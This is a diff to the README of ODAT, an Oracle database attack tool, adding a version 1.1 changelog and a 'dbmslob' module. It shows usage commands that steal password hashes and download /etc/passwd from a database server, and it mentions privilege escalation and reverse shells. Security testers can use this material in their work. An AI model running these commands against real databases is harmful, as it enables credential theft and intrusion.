@@ -8,14 +8,17 @@ Usage examples of ODAT:
 * You have a valid Oracle account on a database and want to __escalate your privileges__ (ex: SYSDBA)
 * You have a valid Oracle account and want to __execute commands on the operating system__ hosting this DB (ex: reverse shell)
 
-Current version: 1.0
-====
-
-Version __1.0__ (2014/06/26)
 
 Tested on Oracle Database __10g__ and __11g__.
 
-No tested on 9g or 12c yet.
+Changelog
+====
+
+* Version __1.1__ (__2014/07/28__) : 
+ * add the *DBMS_LOB* module useful in order to download files stored on a remote server through Oracle Database.
+ * bug fix: java source code: "getenv no longer supported, use properties and -D instead"
+* Version __1.0__ (__2014/06/26__) : 
+ * first ODAT version.
 
 Features
 ====
@@ -38,6 +41,7 @@ Thanks to ODAT, you can:
  * UTL_FILE
  * external tables
  * CTXSYS
+ * DBMS_LOB (NEW : 2014/07/28)
 * __upload files__ on the database server using:
  * UTL_FILE
  * DBMS_XSLPROCESSOR
@@ -435,6 +439,16 @@ This module has been created in order to get hashed password quicly and to picku
 * To get hashed passwords from the users table:
 ```bash
 ./odat.py passwordstealer -s $SERVER -d $SID -U $USER -P $PASSWORD --get-passwords
+```
+
+ *dbmslob* module (NEW : 2014/07/28)
+---
+
+This module uses the DBMS_LOB Oracle library to download files remotely.
+
+* To download the passwd file stored in */etc/* to the tmp.txt local file:
+```bash
+./odat.py dbmslob -s $SERVER -d $SID -U $USER -P $PASSWORD --getFile /etc/ passwd temp.txt
 ```
 
  *stealRemotePwds* module
